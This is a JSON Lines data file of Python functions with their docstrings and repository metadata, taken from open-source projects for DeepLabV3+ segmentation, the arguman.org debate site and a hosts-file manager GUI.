{"docstring": "\"\"\"3x3 convolution with padding\"\"\"\n", "func_signal": "def conv3x3(in_planes, out_planes, stride=1, groups=1, dilation=1):\n", "code": "return nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\n                 padding=dilation, groups=groups, bias=False, dilation=dilation)", "path": "DeepLabV3Plus-Pytorch/network/backbone/resnet.py", "commit_date": "2019-12-02 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\" vis image in visdom\n\"\"\"\n", "func_signal": "def vis_image(self, name, img, env=None, opts=None):\n", "code": "if env is None:\n    env = self.env \nif self.id is not None:\n    name = \"[%s]\"%self.id + name\nwin = self.cur_win.get(name, None)\ndefault_opts = { 'title': name }\nif opts is not None:\n        default_opts.update(opts)\nif win is not None:\n    self.vis.image( img=img, win=win, opts=opts, env=env )\nelse:\n    self.cur_win[name] = self.vis.image( img=img, opts=default_opts, env=env )", "path": "DeepLabV3Plus-Pytorch/utils/visualizer.py", "commit_date": "2019-03-04 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nArgs:\n    img (PIL Image): Image to be scaled.\n    lbl (PIL Image): Label to be scaled.\nReturns:\n    PIL Image: Rescaled image.\n    PIL Image: Rescaled label.\n\"\"\"\n", "func_signal": "def __call__(self, img, lbl):\n", "code": "assert img.size == lbl.size\ntarget_size = ( int(img.size[1]*self.scale), int(img.size[0]*self.scale) ) # (H, W)\nreturn F.resize(img, target_size, self.interpolation), F.resize(lbl, target_size, Image.NEAREST)", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nArgs:\n    img (PIL Image): Image to be flipped.\nReturns:\n    PIL Image: Randomly flipped image.\n\"\"\"\n", "func_signal": "def __call__(self, img, lbl):\n", "code": "if random.random() < self.p:\n    return F.hflip(img), F.hflip(lbl)\nreturn img, lbl", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nMobileNet V2 main class\n\nArgs:\n    num_classes (int): Number of classes\n    width_mult (float): Width multiplier - adjusts number of channels in each layer by this amount\n    inverted_residual_setting: Network structure\n    round_nearest (int): Round the number of channels in each layer to be a multiple of this number\n    Set to 1 to turn off rounding\n\"\"\"\n", "func_signal": "def __init__(self, num_classes=1000, output_stride=8, width_mult=1.0, inverted_residual_setting=None, round_nearest=8):\n", "code": "super(MobileNetV2, self).__init__()\nblock = InvertedResidual\ninput_channel = 32\nlast_channel = 1280\nself.output_stride = output_stride\ncurrent_stride = 1\nif inverted_residual_setting is None:\n    inverted_residual_setting = [\n        # t, c, n, s\n        [1, 16, 1, 1],\n        [6, 24, 2, 2],\n        [6, 32, 3, 2],\n        [6, 64, 4, 2],\n        [6, 96, 3, 1],\n        [6, 160, 3, 2],\n        [6, 320, 1, 1],\n    ]\n\n# only check the first element, assuming user knows t,c,n,s are required\nif len(inverted_residual_setting) == 0 or len(inverted_residual_setting[0]) != 4:\n    raise ValueError(\"inverted_residual_setting should be non-empty \"\n                     \"or a 4-element list, got {}\".format(inverted_residual_setting))\n\n# building first layer\ninput_channel = _make_divisible(input_channel * width_mult, round_nearest)\nself.last_channel = _make_divisible(last_channel * max(1.0, width_mult), round_nearest)\nfeatures = [ConvBNReLU(3, input_channel, stride=2)]\ncurrent_stride *= 2\ndilation=1\nprevious_dilation = 1\n\n# building inverted residual blocks\nfor t, c, n, s in inverted_residual_setting:\n    output_channel = _make_divisible(c * width_mult, round_nearest)\n    previous_dilation = dilation\n    if current_stride == output_stride:\n        stride = 1\n        dilation *= s\n    else:\n        stride = s\n        current_stride *= s\n    output_channel = int(c * width_mult)\n\n    for i in range(n):\n        if i==0:\n            features.append(block(input_channel, output_channel, stride, previous_dilation, expand_ratio=t))\n        else:\n            features.append(block(input_channel, output_channel, 1, dilation, expand_ratio=t))\n        input_channel = output_channel\n# building last several layers\nfeatures.append(ConvBNReLU(input_channel, self.last_channel, kernel_size=1))\n# make it nn.Sequential\nself.features = nn.Sequential(*features)\n\n# building classifier\nself.classifier = nn.Sequential(\n    nn.Dropout(0.2),\n    nn.Linear(self.last_channel, num_classes),\n)\n\n# weight initialization\nfor m in self.modules():\n    if isinstance(m, nn.Conv2d):\n        nn.init.kaiming_normal_(m.weight, mode='fan_out')\n        if m.bias is not None:\n            nn.init.zeros_(m.bias)\n    elif isinstance(m, nn.BatchNorm2d):\n        nn.init.ones_(m.weight)\n        nn.init.zeros_(m.bias)\n    elif isinstance(m, nn.Linear):\n        nn.init.normal_(m.weight, 0, 0.01)\n        nn.init.zeros_(m.bias)", "path": "DeepLabV3Plus-Pytorch/network/backbone/mobilenetv2.py", "commit_date": "2019-12-02 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\n    img (PIL Image): Image to be rotated.\n    lbl (PIL Image): Label to be rotated.\nReturns:\n    PIL Image: Rotated image.\n    PIL Image: Rotated label.\n\"\"\"\n\n", "func_signal": "def __call__(self, img, lbl):\n", "code": "angle = self.get_params(self.degrees)\n\nreturn F.rotate(img, angle, self.resample, self.expand, self.center), F.rotate(lbl, angle, self.resample, self.expand, self.center)", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"Get parameters for ``crop`` for a random crop.\nArgs:\n    img (PIL Image): Image to be cropped.\n    output_size (tuple): Expected output size of the crop.\nReturns:\n    tuple: params (i, j, h, w) to be passed to ``crop`` for random crop.\n\"\"\"\n", "func_signal": "def get_params(img, output_size):\n", "code": "w, h = img.size\nth, tw = output_size\nif w == tw and h == th:\n    return 0, 0, h, w\n\ni = random.randint(0, h - th)\nj = random.randint(0, w - tw)\nreturn i, j, th, tw", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\" save current model\n\"\"\"\n", "func_signal": "def save_ckpt(path):\n", "code": "torch.save({\n    \"cur_itrs\": cur_itrs,\n    \"model_state\": model.module.state_dict(),\n    \"optimizer_state\": optimizer.state_dict(),\n    \"scheduler_state\": scheduler.state_dict(),\n    \"best_score\": best_score,\n}, path)\nprint(\"Model saved as %s\" % path)", "path": "DeepLabV3Plus-Pytorch/main.py", "commit_date": "2020-03-29 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"List all files ending with a suffix at a given root\nArgs:\n    root (str): Path to directory whose folders need to be listed\n    suffix (str or tuple): Suffix of the files to match, e.g. '.png' or ('.jpg', '.png').\n        It uses the Python \"str.endswith\" method and is passed directly\n    prefix (bool, optional): If true, prepends the path to each result, otherwise\n        only returns the name of the files found\n\"\"\"\n", "func_signal": "def list_files(root, suffix, prefix=False):\n", "code": "root = os.path.expanduser(root)\nfiles = list(\n    filter(\n        lambda p: os.path.isfile(os.path.join(root, p)) and p.endswith(suffix),\n        os.listdir(root)\n    )\n)\n\nif prefix is True:\n    files = [os.path.join(root, d) for d in files]\n\nreturn files", "path": "DeepLabV3Plus-Pytorch/datasets/utils.py", "commit_date": "2019-02-28 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"Get a randomized transform to be applied on image.\n\nArguments are same as that of __init__.\n\nReturns:\n    Transform which randomly adjusts brightness, contrast and\n    saturation in a random order.\n\"\"\"\n", "func_signal": "def get_params(brightness, contrast, saturation, hue):\n", "code": "transforms = []\n\nif brightness is not None:\n    brightness_factor = random.uniform(brightness[0], brightness[1])\n    transforms.append(Lambda(lambda img: F.adjust_brightness(img, brightness_factor)))\n\nif contrast is not None:\n    contrast_factor = random.uniform(contrast[0], contrast[1])\n    transforms.append(Lambda(lambda img: F.adjust_contrast(img, contrast_factor)))\n\nif saturation is not None:\n    saturation_factor = random.uniform(saturation[0], saturation[1])\n    transforms.append(Lambda(lambda img: F.adjust_saturation(img, saturation_factor)))\n\nif hue is not None:\n    hue_factor = random.uniform(hue[0], hue[1])\n    transforms.append(Lambda(lambda img: F.adjust_hue(img, hue_factor)))\n\nrandom.shuffle(transforms)\ntransform = Compose(transforms)\n\nreturn transform", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"Download a file from a url and place it in root.\nArgs:\n    url (str): URL to download file from\n    root (str): Directory to place downloaded file in\n    filename (str): Name to save the file under. If None, use the basename of the URL\n    md5 (str): MD5 checksum of the download. If None, do not check\n\"\"\"\n", "func_signal": "def download_url(url, root, filename=None, md5=None):\n", "code": "from six.moves import urllib\n\nroot = os.path.expanduser(root)\nif not filename:\n    filename = os.path.basename(url)\nfpath = os.path.join(root, filename)\n\nmakedir_exist_ok(root)\n\n# downloads file\nif os.path.isfile(fpath) and check_integrity(fpath, md5):\n    print('Using downloaded and verified file: ' + fpath)\nelse:\n    try:\n        print('Downloading ' + url + ' to ' + fpath)\n        urllib.request.urlretrieve(\n            url, fpath,\n            reporthook=gen_bar_updater(tqdm(unit='B', unit_scale=True))\n        )\n    except OSError:\n        if url[:5] == 'https':\n            url = url.replace('https:', 'http:')\n            print('Failed download. Trying https -> http instead.'\n                  ' Downloading ' + url + ' to ' + fpath)\n            urllib.request.urlretrieve(\n                url, fpath,\n                reporthook=gen_bar_updater(tqdm(unit='B', unit_scale=True))\n            )", "path": "DeepLabV3Plus-Pytorch/datasets/utils.py", "commit_date": "2019-02-28 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "#padding = (kernel_size - 1) // 2\n", "func_signal": "def __init__(self, in_planes, out_planes, kernel_size=3, stride=1, dilation=1, groups=1):\n", "code": "super(ConvBNReLU, self).__init__(\n    nn.Conv2d(in_planes, out_planes, kernel_size, stride, 0, dilation=dilation, groups=groups, bias=False),\n    nn.BatchNorm2d(out_planes),\n    nn.ReLU6(inplace=True)\n)", "path": "DeepLabV3Plus-Pytorch/network/backbone/mobilenetv2.py", "commit_date": "2019-12-02 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nArgs:\n    img (PIL Image): Image to be scaled.\n    lbl (PIL Image): Label to be scaled.\nReturns:\n    PIL Image: Rescaled image.\n    PIL Image: Rescaled label.\n\"\"\"\n", "func_signal": "def __call__(self, img, lbl):\n", "code": "assert img.size == lbl.size\nscale = random.uniform(self.scale_range[0], self.scale_range[1])\ntarget_size = ( int(img.size[1]*scale), int(img.size[0]*scale) )\nreturn F.resize(img, target_size, self.interpolation), F.resize(lbl, target_size, Image.NEAREST)", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nArgs:\n    img (PIL Image): Input image.\n\nReturns:\n    PIL Image: Color jittered image.\n\"\"\"\n", "func_signal": "def __call__(self, img, lbl):\n", "code": "transform = self.get_params(self.brightness, self.contrast,\n                            self.saturation, self.hue)\nreturn transform(img), lbl", "path": "DeepLabV3Plus-Pytorch/utils/ext_transforms.py", "commit_date": "2019-12-13 00:00:00", "repo_name": "VainF/DeepLabV3Plus-Pytorch", "stars": 1626, "license": "mit", "language": "python", "size": 8479}
{"docstring": "\"\"\"\nAdds the entries of followed profile to follower's newsfeed.\n\"\"\"\n", "func_signal": "def add_to_recipients(follower, following, **kwargs):\n", "code": "Entry.objects.add_to_recipients(\n    following=following, follower=follower)", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nCreates fallacy entries.\n\"\"\"\n", "func_signal": "def create_fallacy_entry(report, **kwargs):\n", "code": "Entry.objects.create(\n    object_id=report.id,\n    news_type=report.get_newsfeed_type(),\n    sender=report.get_actor(),\n    related_object=report.get_newsfeed_bundle()\n)", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nRewrites the proxy headers so that only the most\nrecent proxy is used.\n\"\"\"\n", "func_signal": "def process_request(self, request):\n", "code": "for field in self.FORWARDED_FOR_FIELDS:\n    if field in request.META:\n        if ',' in request.META[field]:\n            parts = request.META[field].split(',')\n            request.META[field] = parts[-1].strip()", "path": "arguman.org/web/i18n/middleware.py", "commit_date": "2015-10-31 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nAdds the id of follower to the recipients of\nfollowed profile's entries.\n\"\"\"\n", "func_signal": "def add_to_recipients(self, following, follower):\n", "code": "self.collection.update(\n    {\"sender.username\": following.username},\n    {\"$push\": {\"recipients\": follower.id}}, multi=True)", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nRemoves the entries of unfollowed profile.\n\"\"\"\n", "func_signal": "def remove_from_recipients(follower, following, **kwargs):\n", "code": "Entry.objects.remove_from_recipients(following=following,\n                                     follower=follower)", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nPrefer http referer for redirect\n\"\"\"\n", "func_signal": "def response_action(self, request, queryset):\n", "code": "_super = super(ActionInChangeFormMixin, self)\nresponse = _super.response_action(request, queryset)\nif isinstance(response, HttpResponseRedirect):\n    response['Location'] = request.META.get(\n                        'HTTP_REFERER', response.url)\nreturn response", "path": "arguman.org/web/nouns/admin.py", "commit_date": "2015-11-15 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nSends notification to the followed user from the follower.\n\"\"\"\n", "func_signal": "def create_following_notification(following, follower, **kwargs):\n", "code": "Notification.objects.create(\n    target_object_id=follower.id,\n    notification_type=NOTIFICATION_FOLLOWED_A_PROFILE,\n    sender=follower,\n    recipient_id=following.id\n)", "path": "arguman.org/web/profiles/models.py", "commit_date": "2015-12-08 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nReturns a JSON response, transforming 'context' to make the payload.\n\"\"\"\n", "func_signal": "def render_to_response(self, context, **response_kwargs):\n", "code": "if not self.is_json():\n    return super(SearchView, self).render_to_response(\n        context, **response_kwargs)\n\nresults = [{\n               \"id\": result['object'].id,\n               \"label\": unicode(result['object'])\n           } for result in context['results']]\n\nreturn HttpResponse(\n    json.dumps(results),\n    dict(content_type='application/json', **response_kwargs)\n)", "path": "arguman.org/web/premises/views.py", "commit_date": "2018-11-28 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "# Since User.username is unique, this check is redundant,\n# but it sets a nicer error message than the ORM. See #13147.\n", "func_signal": "def clean_username(self):\n", "code": "username = self.cleaned_data[\"username\"]\ntry:\n    Profile._default_manager.get(username__iexact=username)\nexcept Profile.DoesNotExist:\n    return username\nraise forms.ValidationError(\n    self.error_messages['duplicate_username'],\n    code='duplicate_username',\n)", "path": "arguman.org/web/profiles/forms.py", "commit_date": "2016-09-22 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nFetches news items from the newsfeed database\n\"\"\"\n", "func_signal": "def get_private_newsfeed(self, offset, limit, user):\n", "code": "parameters = {\n    \"recipients\": {\n        \"$in\": [user.id]\n    },\n    \"news_type\": {\n        \"$in\": [NEWS_TYPE_CONTENTION,\n                NEWS_TYPE_PREMISE,\n                NEWS_TYPE_FALLACY,\n                NEWS_TYPE_FOLLOWING]\n    }\n}\n\nnewsfeed = (Entry\n            .objects\n            .collection\n            .find(parameters)\n            .sort([(\"date_created\", -1)])\n            .skip(offset)\n            .limit(limit))\nreturn map(Entry, newsfeed)", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nRemoves follower id from the recipients of followed profile's entries.\n\"\"\"\n", "func_signal": "def remove_from_recipients(self, following, follower):\n", "code": "self.collection.update(\n    {\"sender.username\": following.username},\n    {\"$pull\": {\"recipients\": follower.id}}, multi=True)", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nReturns a JSON response, transforming 'context' to make the payload.\n\"\"\"\n", "func_signal": "def render_to_response(self, context, **response_kwargs):\n", "code": "response_kwargs['content_type'] = 'application/json'\nreturn self.response_class(\n    self.convert_context_to_json(context),\n    **response_kwargs\n)", "path": "arguman.org/web/profiles/mixins.py", "commit_date": "2014-10-12 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nAdds extra context to template\n\"\"\"\n", "func_signal": "def get_context_data(self, **kwargs):\n", "code": "user = self.get_object()\nreturn super(ProfileDetailView, self).get_context_data(\n    related_channels=self.get_related_channels(user),\n    discussed_users=self.get_discussed_users(user),\n    supported_premises=self.get_supported_premises(user),\n    **kwargs\n)", "path": "arguman.org/web/profiles/views.py", "commit_date": "2015-12-08 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nRemoves news entry from provided object type and object id.\n\"\"\"\n", "func_signal": "def delete(self, object_type, object_id):\n", "code": "self.collection.remove({\n    \"news_type\": object_type,\n    \"object_id\": object_id})", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nFetches news items from the newsfeed database\n\"\"\"\n", "func_signal": "def get_public_newsfeed(self, offset, limit):\n", "code": "language = self.get_language()\n\nparameters = {\n    \"news_type\": {\n        \"$in\": [NEWS_TYPE_CONTENTION,\n                NEWS_TYPE_PREMISE,\n                NEWS_TYPE_FALLACY]\n    },\n    \"related_object.language\": language\n}\n\nnewsfeed = (Entry\n            .objects\n            .collection\n            .find(parameters)\n            .sort([(\"date_created\", -1)])\n            .skip(offset)\n            .limit(limit))\nreturn map(Entry, newsfeed)", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nCreates news entries for contentions.\n\"\"\"\n", "func_signal": "def create_contention_entry(instance, created, **kwargs):\n", "code": "if created:\n    Entry.objects.create(\n        object_id=instance.id,\n        news_type=instance.get_newsfeed_type(),\n        sender=instance.get_actor(),\n        related_object=instance.get_newsfeed_bundle()\n    )", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\" Builds an gravatar <img> tag from an user or email \"\"\"\n", "func_signal": "def gravatar(user_or_email, size=GRAVATAR_DEFAULT_SIZE, alt_text='', css_class='gravatar'):\n", "code": "if hasattr(user_or_email, 'email'):\n    email = user_or_email.email\nelse:\n    email = user_or_email\n\ntry:\n    url = escape(get_gravatar_url(email=email, size=size))\nexcept:\n    return ''\ntemplate = '<img class=\"{css_class}\" src=\"{src}\" width=\"{width}\" height=\"{height}\" alt=\"{alt}\" />'\nreturn template.format(\n    css_class=css_class, src=url, width=size, height=size, alt=alt_text)", "path": "arguman.org/web/premises/templatetags/premise_tags.py", "commit_date": "2016-04-08 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "# CALCULATES THE KARMA POINT OF USER\n# ACCORDING TO HOW MANY TIMES SUPPORTED * 2\n# DECREASE BY FALLACY COUNT * 2\n# HOW MANY CHILD PREMISES ARE ADDED TO USER'S PREMISES\n", "func_signal": "def calculate_karma(self):\n", "code": "karma = 0\nsupport_sum = self.user_premises.aggregate(Count('supporters'))\nkarma += 2 * support_sum['supporters__count']\nmain_premises = self.user_premises.all()\nall_sub_premises = []\nfor premise in main_premises:\n    all_sub_premises += premise.published_children().values_list('pk',\n                                                                 flat=True)\n    karma -= 2 * (premise.reports.count())\nnot_owned_sub_premises = Premise.objects.\\\n    filter(id__in=all_sub_premises).\\\n    exclude(user__id=self.id).count()\nkarma += not_owned_sub_premises\nreturn karma", "path": "arguman.org/web/profiles/models.py", "commit_date": "2015-12-08 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nFetches news items of specific user\n\"\"\"\n", "func_signal": "def get_newsfeed_of(self, user, offset, limit):\n", "code": "parameters = {\n    \"sender.username\": user.username,\n    \"news_type\": {\n        \"$in\": [NEWS_TYPE_CONTENTION,\n                NEWS_TYPE_PREMISE,\n                NEWS_TYPE_FOLLOWING]\n    }\n}\n\nnewsfeed = (Entry\n            .objects\n            .collection\n            .find(parameters)\n            .sort([(\"date_created\", -1)])\n            .skip(offset)\n            .limit(limit))\nreturn map(Entry, newsfeed)", "path": "arguman.org/web/newsfeed/models.py", "commit_date": "2015-11-29 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nAdds extra context to template\n\"\"\"\n", "func_signal": "def get_context_data(self, **kwargs):\n", "code": "user = self.get_object()\n\ncan_follow = self.request.user != user\n\nif self.request.user.is_authenticated():\n    is_followed = self.request.user.following.filter(\n        pk=user.id).exists()\nelse:\n    is_followed = False\n\nreturn super(BaseProfileDetailView, self).get_context_data(\n    can_follow=can_follow,\n    is_followed=is_followed,\n    tab_name=self.tab_name,\n    **kwargs\n)", "path": "arguman.org/web/profiles/views.py", "commit_date": "2015-12-08 00:00:00", "repo_name": "arguman/arguman.org", "stars": 1379, "license": "other", "language": "python", "size": 2699}
{"docstring": "\"\"\"\nRetrieve a new hosts data file from a server.\n\"\"\"\n", "func_signal": "def fetch_update(self):\n", "code": "self.set_fetch_start_btns()\nthread = QSubFetchUpdate(self)\nthread.prog_trigger.connect(self.set_down_progress)\nthread.finish_trigger.connect(self.finish_fetch)\nthread.start()", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nOperations to check the connection to current server.\n\"\"\"\n", "func_signal": "def check_connection(self):\n", "code": "thread = QSubChkConnection(self)\nthread.trigger.connect(self.set_conn_status)\nthread.start()", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nCheck if current session is ran with root privileges.\n\n.. note:: IF current session does not has the write privileges to the\n    hosts file of current system, a warning message box would popup.\n\n.. note:: ALL operation would change the `hosts` file on current\n    system could only be done while current session has write\n    privileges to the file.\n\"\"\"\n", "func_signal": "def check_writable(self):\n", "code": "writable = CommonUtil.check_privileges()[1]\nself._writable = writable\nif not writable:\n    self.warning_permission()", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nDisplay the export dialog and get the path to save the exported hosts\nfile.\n\n:return: Path to export a hosts file.\n:rtype: str\n\"\"\"\n", "func_signal": "def export_hosts(self):\n", "code": "filename = \"hosts\"\nif self.platform == \"OS X\":\n    filename = \"/Users/\" + filename\nfilepath = QtGui.QFileDialog.getSaveFileName(\n    self, _translate(\"Util\", \"Export hosts\", None),\n    QtCore.QString(filename),\n    _translate(\"Util\", \"hosts File\", None))\nreturn filepath", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nInitialize a new instance of this class. Retrieve configuration from\nthe main dialog to make a new hosts file.\n\n:param parent: An instance of :class:`~gui.qdialog_d.QDialogDaemon`\n    class to fetch settings from.\n:type parent: :class:`~gui.qdialog_d.QDialogDaemon`\n\n.. warning:: :attr:`parent` MUST NOT be set as `None`.\n\"\"\"\n", "func_signal": "def __init__(self, parent):\n", "code": "QtCore.QThread.__init__(self, parent)\nMakeHosts.__init__(self, parent)", "path": "huhamhire-hosts/gui/_make.py", "commit_date": "2014-01-21 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nMake the new hosts file by the configuration defined by `make_cfg`\nfrom function list on the main dialog.\n\n:param make_cfg: Module settings in byte word format.\n:type make_cfg: dict\n\n.. seealso:: :attr:`make_cfg` in :class:`~tui.curses_d.CursesDaemon`\n    class.\n\"\"\"\n", "func_signal": "def get_hosts(self, make_cfg):\n", "code": "for part_id in sorted(make_cfg.keys()):\n    mod_cfg = make_cfg[part_id]\n    if not RetrieveData.chk_mutex(part_id, mod_cfg):\n        return\n    mods = RetrieveData.get_ids(mod_cfg)\n    for mod_id in mods:\n        self.mod_num += 1\n        hosts, mod_name = RetrieveData.get_host(part_id, mod_id)\n        self.info_trigger.emit(mod_name, self.mod_num)\n        if part_id == 0x02:\n            self.write_localhost_mod(hosts)\n        elif part_id == 0x04:\n            self.write_customized()\n        else:\n            self.write_common_mod(hosts, mod_name)", "path": "huhamhire-hosts/gui/_make.py", "commit_date": "2014-01-21 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nReload the data file information and show them on the main dialog. The\ninformation here includes both metadata and hosts module info from the\ndata file.\n\n:param refresh: A flag indicating whether the information on main\n    dialog needs to be reloaded or not. The value could be `0` or `1`.\n\n        =======  =============\n        refresh  operation\n        =======  =============\n        0        Do NOT reload\n        1        Reload\n        =======  =============\n\n:type refresh: int\n\"\"\"\n", "func_signal": "def refresh_info(self, refresh=0):\n", "code": "if refresh and RetrieveData.conn is not None:\n    RetrieveData.clear()\ntry:\n    RetrieveData.unpack()\n    RetrieveData.connect_db()\n    self.set_func_list(refresh)\n    self.refresh_func_list()\n    self.set_info()\nexcept (BadZipfile, IOError, OSError):\n    self.warning_incorrect_datafile()", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nStart operations to retrieve data from the data file and generate new\nhosts file.\n\"\"\"\n", "func_signal": "def run(self):\n", "code": "start_time = time.time()\nself.make()\nend_time = time.time()\ntotal_time = \"%.4f\" % (end_time - start_time)\nself.fina_trigger.emit(total_time, self.count)\nif self.make_mode == \"system\":\n    self.move_trigger.emit()", "path": "huhamhire-hosts/gui/_make.py", "commit_date": "2014-01-21 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
{"docstring": "\"\"\"\nSet the information of current operating system platform.\n\"\"\"\n", "func_signal": "def set_platform(self):\n", "code": "system, hostname, path, encode, flag = CommonUtil.check_platform()\nself.platform = system\nself.hostname = hostname\nself.hosts_path = path\nself.plat_flag = flag\nif encode == \"win_ansi\":\n    self.sys_eol = \"\\r\\n\"\nelse:\n    self.sys_eol = \"\\n\"", "path": "huhamhire-hosts/gui/qdialog_d.py", "commit_date": "2014-07-07 00:00:00", "repo_name": "huhamhire/huhamhire-hosts", "stars": 1504, "license": "gpl-3.0", "language": "python", "size": 191836}
